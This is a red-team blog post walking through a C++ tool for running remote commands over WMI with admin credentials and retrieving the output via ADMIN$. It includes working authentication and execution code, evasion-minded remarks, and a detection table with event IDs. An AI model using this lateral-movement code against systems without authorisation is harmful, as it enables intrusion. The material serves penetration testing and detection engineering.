---
layout: post
title: "Building a WMI Remote Execution Tool in C++"
date: 2026-04-06
tags: [tooling, lateral-movement, WMI, C++, red-team]
summary: "A walkthrough of wmiexec, a C++ implementation of WMI-based remote command execution using native Windows COM APIs, modelled on Impacket's wmiexec.py."
---

Impacket's `wmiexec.py` is a staple on engagements. You get a pseudo-shell over WMI without touching SMB exec or PSExec, and it's relatively quiet at least on default audit configurations. I wanted to understand it at the API level rather than just using it, so I built a C++ equivalent using native Windows COM. It can also be handy on standard internal pentesting engagements when you have credentials for an admin account and the usual tools are blocked. This post is a walkthrough of how it works.

The tool is on GitHub: [github.com/ilkyr/wmiexec](https://github.com/ilkyr/wmiexec).

---

## Why WMI?

WMI (Windows Management Instrumentation) is Microsoft's implementation of WBEM, a standard for system management that exposes a queryable interface to almost everything on a Windows machine. Processes, services, registry, hardware, network config. Importantly, `Win32_Process.Create` lets you spawn a process on a remote machine if you have admin credentials and WMI connectivity (TCP/135 + ephemeral RPC ports).

From an operator perspective:
- No service binary written to disk (unlike PSExec)
- No SMB named pipe for execution (unlike SMBExec)
- Traffic encrypted at the RPC layer with packet privacy
- `cmd.exe` is the only process spawned (no overly suspicious binary)

The trade-off is that you need SMB (445) alongside WMI to retrieve output, since Win32_Process.Create has no stdout, it returns a PID and an error code, nothing else.

---

## Architecture

The tool is split into focused modules:

```
main.cpp            — CLI parsing, COM init, auth, interactive REPL
remote_command.cpp  — Win32_Process.Create invocation over WMI
smb_connection.cpp  — ADMIN$ mount for output retrieval
output_handling.cpp — Read remote file, print, delete
```

The execution loop is straightforward:

1. Initialise COM with packet-privacy security
2. Connect to `\\target\root\cimv2` via `IWbemLocator`
3. Set authentication on the proxy (NTLM or Kerberos)
4. Mount `\\target\ADMIN$` for I/O
5. For each command: run it via WMI → wait → read the output file over SMB → delete

---

## COM Initialisation and Security

Before any WMI call, COM needs to be initialised with a security context. This is the part most examples get wrong or skip.

```cpp
CoInitializeEx(0, COINIT_MULTITHREADED);

CoInitializeSecurity(
    NULL, -1, NULL, NULL,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,   // encrypt all packets
    RPC_C_IMP_LEVEL_IMPERSONATE,      // allow impersonation
    NULL,
    EOAC_DYNAMIC_CLOAKING,            // update creds per RPC call
    NULL
);
```

`RPC_C_AUTHN_LEVEL_PKT_PRIVACY` encrypts the entire RPC stream — commands and output are not visible on the wire. `EOAC_DYNAMIC_CLOAKING` ensures the proxy picks up updated credentials per call rather than caching the initial token, which matters when you're switching between COM objects mid-session.

`CoInitializeSecurity` can only be called once per process, and it must be called before any COM object is created. If you forget it, WMI connections to remote systems either fail or fall back to unauthenticated access.

---

## Connecting to WMI

```cpp
IWbemLocator* pLoc = nullptr;
CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                 IID_IWbemLocator, (LPVOID*)&pLoc);

IWbemServices* pSvc = nullptr;
pLoc->ConnectServer(
    bPath,      // L"\\\\target\\root\\cimv2"
    bUser,      // L"DOMAIN\\user" or NULL for Kerberos
    bPass,      // password or NULL
    NULL, 0,
    bAuthority, // L"Kerberos:HOST/target" or NULL
    NULL,
    &pSvc
);
```

`ConnectServer` establishes the WMI session. For password auth, you pass credentials directly. For Kerberos, you leave them NULL and set the authority string — the LSA picks up the cached TGT automatically.

After getting `pSvc`, you must call `CoSetProxyBlanket` on it to apply your auth context. Without this, the proxy inherits the process security context, which for a remote connection usually means anonymous.

---

## Authentication

### Password / NTLM

```cpp
COAUTHIDENTITY ident{};
ident.User           = (USHORT*)username.c_str();
ident.UserLength     = (ULONG)username.size();
ident.Domain         = (USHORT*)domain.c_str();
ident.DomainLength   = (ULONG)domain.size();
ident.Password       = (USHORT*)password.c_str();
ident.PasswordLength = (ULONG)password.size();
ident.Flags          = SEC_WINNT_AUTH_IDENTITY_UNICODE;

CoSetProxyBlanket(
    pSvc,
    RPC_C_AUTHN_WINNT,              // NTLM
    RPC_C_AUTHZ_NONE,
    NULL,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
    RPC_C_IMP_LEVEL_IMPERSONATE,
    &ident,
    EOAC_NONE
);
```

The `COAUTHIDENTITY` struct carries credentials inline and is passed to every proxy blanket call on every COM object in the chain, including `pClass`, `pInParamsDef`, and `pInParams` later on.

### Kerberos

```cpp
// Primary: GSS_NEGOTIATE (tries Kerberos first, falls back gracefully)
CoSetProxyBlanket(
    pSvc,
    RPC_C_AUTHN_GSS_NEGOTIATE,
    RPC_C_AUTHZ_NONE,
    spn,                            // L"HOST/target.domain.local"
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
    RPC_C_IMP_LEVEL_IMPERSONATE,
    NULL,                           // no explicit creds — use TGT
    EOAC_DYNAMIC_CLOAKING
);

// Fallback: hard Kerberos if Negotiate fails
CoSetProxyBlanket(pSvc, RPC_C_AUTHN_GSS_KERBEROS, ...);
```

No credentials passed. The LSA handles TGT → TGS-REQ for `HOST/<target>`. The authority string on `ConnectServer` tells WMI which SPN to request a ticket for.

---

## Remote Command Execution

This is the core of the tool. The WMI call chain to invoke `Win32_Process.Create`:

```cpp
// 1. Get the class definition
IWbemClassObject* pClass = nullptr;
pSvc->GetObject(L"Win32_Process", 0, nullptr, &pClass, nullptr);

// 2. Get the Create method signature
IWbemClassObject* pInParamsDef = nullptr;
pClass->GetMethod(L"Create", 0, &pInParamsDef, nullptr);

// 3. Spawn a parameter instance
IWbemClassObject* pInParams = nullptr;
pInParamsDef->SpawnInstance(0, &pInParams);

// 4. Set the CommandLine parameter
std::wstring cmd = L"cmd.exe /C " + command
                 + L" > C:\\Windows\\Temp\\output_" + stamp + L".txt 2>&1";
VARIANT varCmd;
varCmd.vt       = VT_BSTR;
varCmd.bstrVal  = SysAllocString(cmd.c_str());
pInParams->Put(L"CommandLine", 0, &varCmd, 0);

// 5. Execute
IWbemClassObject* pOutParams = nullptr;
pSvc->ExecMethod(L"Win32_Process", L"Create", 0, nullptr,
                 pInParams, &pOutParams, nullptr);

// 6. Check return code
VARIANT vRet;
pOutParams->Get(L"ReturnValue", 0, &vRet, nullptr, 0);
// 0 = success; anything else is a Win32 error
```

A few things worth noting:

- `GetObject` + `GetMethod` + `SpawnInstance` is the correct pattern. You can't just construct a `VARIANT` with the method name and fire it. WMI needs the parameter schema from the class definition first.
- Every COM object in this chain (`pClass`, `pInParamsDef`, `pInParams`) gets `CoSetProxyBlanket` applied to it with the same auth context. Skip any one of these and you'll get `WBEM_E_ACCESS_DENIED` mid-chain in ways that are painful to debug.
- `ExecMethod` is synchronous here. The remote process is created, and control returns immediately. It does not wait for the command to finish. That's why there's a `Sleep(1000)` before reading output, which is crude but works for most commands.

---

## Output Retrieval via SMB

Since WMI gives us no stdout, the command is wrapped in `cmd.exe /C ... > file 2>&1`. Output goes to `C:\Windows\Temp\output_<timestamp>.txt` on the target. We read it back over SMB.

The SMB connection is established with `WNetAddConnection2W` against `\\target\ADMIN$`:

```cpp
NETRESOURCE nr{};
nr.dwType      = RESOURCETYPE_DISK;
nr.lpRemoteName = const_cast<LPWSTR>(L"\\\\target\\ADMIN$");

WNetAddConnection2W(&nr, password, username, 0);
```

A known annoyance: if there's an existing session to the same host with different credentials, you get `ERROR_SESSION_CREDENTIAL_CONFLICT` (1219). The connection code handles this by calling `WNetCancelConnection2W` with `fForce=TRUE` before each attempt, and also tries connecting to `IPC$` first to establish a named session that ADMIN$ can inherit.

Once mounted, reading the output is just opening a file via its UNC path:

```cpp
std::wstring readPath = L"\\\\" + target + L"\\ADMIN$\\Temp\\output_" + stamp + L".txt";
std::wifstream f(readPath);
```

After reading, `DeleteFileW` removes the file. It may fail silently if the target's SYSTEM account locked it — acceptable for now.

---

## Filename Collision Avoidance

Each command gets a unique output filename built from a timestamp and a monotonic counter:

```cpp
// Format: YYYYMMDDHHmmss_N
auto t = std::time(nullptr);
std::tm tm{}; localtime_s(&tm, &t);

std::wostringstream ws;
ws << std::put_time(&tm, L"%Y%m%d%H%M%S") << L"_" << counter++;
std::wstring stamp = ws.str();
```

This avoids collisions if you run commands fast enough to land within the same second, and gives forensic investigators a nice timestamp to work with if they find the files — a trade-off I'll fix with randomised names in a future version.

---

## Cleanup

Before the process exits, credentials are zeroed from memory:

```cpp
SecureZeroMemory(&passwordW[0], passwordW.size() * sizeof(wchar_t));
```

`SecureZeroMemory` is the correct call here. The compiler won't optimise it away the way it can with `memset`, since it uses a volatile pointer internally.

COM objects are released in reverse order of creation. Releasing a parent before a child leads to bad refcount states and occasional access violations on shutdown — order matters.

---

## Detection Surface

This tool is not magic, and operators should know where it leaves marks:

| Artefact | Where | Mitigations |
|---|---|---|
| `Win32_Process.Create` execution | WMI-Activity/Operational event log (5857, 5861) | Hard to avoid; this is the core mechanism |
| ADMIN$ access | Security event 5140 (network share access) | Use a different exfil path |
| Output file on disk | `C:\Windows\Temp\output_*.txt` | Randomise names; encrypt contents |
| Logon event | Security event 4624 (type 3, network logon) | Expected for any remote admin |
| RPC connection to port 135 + ephemeral | Network logs | Encrypted, but the connection itself is visible |

WMI-based execution is detectable with the right logging in place. `Microsoft-Windows-WMI-Activity/Operational` logs `Win32_Process.Create` calls if `OperationalStatus` auditing is enabled. It is not enabled by default, but mature environments often have it. Correlate that with a 4624 type-3 logon from an unusual source and you have a solid detection.

---

## What's Next

A few things I want to add:

- **Encrypted output files** — write AES-encrypted output on the target, decrypt client-side. Removes plaintext artefacts from disk.
- **Random output filenames** — swap the timestamp for a random GUID.
- **Upload/download** — file transfer over the existing ADMIN$ mount without spawning a process.
- **PTH support** — pass-the-hash via `NtLmSsp` flag manipulation.

Code is at [github.com/ilkyr/wmiexec](https://github.com/ilkyr/wmiexec). Built and tested on Windows 10/11 and Server 2019/2022.
